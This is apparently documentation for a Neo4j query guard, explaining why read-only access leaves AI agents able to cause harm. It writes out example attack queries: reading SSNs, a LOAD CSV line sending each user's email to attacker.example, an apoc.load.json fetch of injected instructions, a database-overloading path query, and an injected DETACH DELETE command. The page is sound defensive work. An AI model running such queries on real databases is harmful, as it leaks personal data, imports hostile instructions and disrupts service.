---
title: What read-only does — and doesn't — protect when AI agents access Neo4j
description: Read-only access blocks writes, but not queries that read sensitive data, send data to another server, fetch instructions or overload the database.
sidebar_position: 5
---

Read-only access is the usual first safeguard when an AI agent queries Neo4j, and it does one job: the agent cannot change the data. But changing data is not the only harm a query can do. The agent's queries are written by a language model, from text that other people can control, and many harmful queries never write anything.

## What counts as read-only

There are two common ways to give an agent read-only access. On Enterprise Edition and Aura, the agent connects as a database user whose role grants only read privileges, such as the built-in `reader` role, and Neo4j refuses any write from that user. Community Edition has no roles, so the usual option there is the `read_only` setting of the Neo4j MCP server. It removes the server's write tool and refuses queries that Neo4j classifies as writes.

## What read-only protects

Both stop queries that change the graph. Whatever query the agent writes, it cannot create nodes, update properties or delete data. If an injected prompt tells the agent to run `MATCH (n) DETACH DELETE n`, the query fails and the graph is unchanged.

## What read-only doesn't protect

Read-only asks one question about a query: does it write? A query that only reads passes, whatever else it does. These four queries pass, and each one still causes harm.

The first reads data the agent should not see. Read-only access controls what a query can change, not what it can read, so if the graph stores social security numbers, the agent can return them. Whatever a query returns goes into the agent's context, and from there to whoever is talking to the agent.

```cypher
MATCH (p:Person) RETURN p.name, p.ssn
```

The second sends data to another server. `LOAD CSV` is a read clause: it reads rows from a file or a URL. When the URL is built from graph data, the request itself carries the data out. This query sends one request per user, each with that user's email in it.

```cypher
MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row RETURN row
```

The third brings instructions in. APOC procedures such as `apoc.load.json` also read URLs. The response comes back to the agent as query results, and the agent can follow instructions written in it. The database becomes the path for a prompt injection.

```cypher
CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
```

The fourth overloads the database. A query can read so much that it uses up the database's memory and keeps other queries waiting. This one counts every path in the graph.

```cypher
MATCH p = ()-[*]-() RETURN count(p)
```

## How to cover the gaps

The first three need a check that looks at what a query does, not only whether it writes. `neo4j-guard` parses each query before it is sent and allows only read clauses, built-in functions, and schema and search procedures. That blocks `LOAD CSV` and APOC, which covers the second and third queries. Properties listed in `disallow` are blocked in queries and in returned records, which covers the first.

The fourth query uses only clauses that `neo4j-guard` allows, so it needs a different limit: a transaction timeout, after which Neo4j stops the query.

The example below uses both. Install `neo4j-guard`:

```sh
pip install neo4j-guard
```

Then guard the driver the agent uses, and run the agent's queries through a function that sets a timeout:

```python
from neo4j import GraphDatabase, Query
from neo4j_guard import GuardError, guard

driver = guard(
    GraphDatabase.driver("neo4j://localhost:7687", auth=("neo4j", "password")),
    disallow=["Person.ssn"],
)

def run_cypher(query: str) -> list[dict] | str:
    """Run a Cypher query with a 5-second timeout and return its records, or why it was blocked."""
    try:
        with driver.session() as session:
            return session.run(Query(query, timeout=5)).data()
    except GuardError as error:
        return f"Query blocked: {error}"

```
